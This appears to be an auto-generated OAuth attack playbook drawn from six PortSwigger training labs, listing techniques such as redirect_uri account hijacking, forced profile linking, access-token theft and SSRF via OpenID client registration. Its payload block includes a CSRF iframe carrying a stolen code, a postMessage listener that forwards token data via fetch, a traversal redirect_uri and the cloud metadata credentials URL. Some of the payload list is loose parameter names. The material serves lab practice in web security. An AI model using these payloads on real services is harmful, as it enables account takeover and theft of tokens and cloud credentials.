## OAUTH Playbook
*Synthesized from 6 PortSwigger labs*

### Overview
This playbook covers 6 known attack techniques for oauth.

### Attack Techniques

**Bypass Techniques:**
- Authentication bypass via OAuth implicit flow

**General:**
- OAuth account hijacking via redirect_uri
- Forced OAuth profile linking
- Stealing OAuth access tokens via a proxy page
- Stealing OAuth access tokens via an open redirect
- SSRF via OpenID dynamic client registration

### Key Payloads
```
window.location.href
GET /auth?client_id[...]
<iframe src="https://[LAB_ID].[TARGET]/oauth-linking?code=STOLEN-CODE"></iframe>
GET /post/next?path=[...]
path
GET /?access_token=[...]
client_id
https://[LAB_ID].[TARGET]/oauth-callback/../post?postId=1
https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration
<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>
GET /client/CLIENT-ID/logo
/oauth-linking
POST /reg
CLIENT-ID
/../
redirect_uris
GET /oauth-linking?code=[...]
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
redirect_uri
POST /authenticate
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

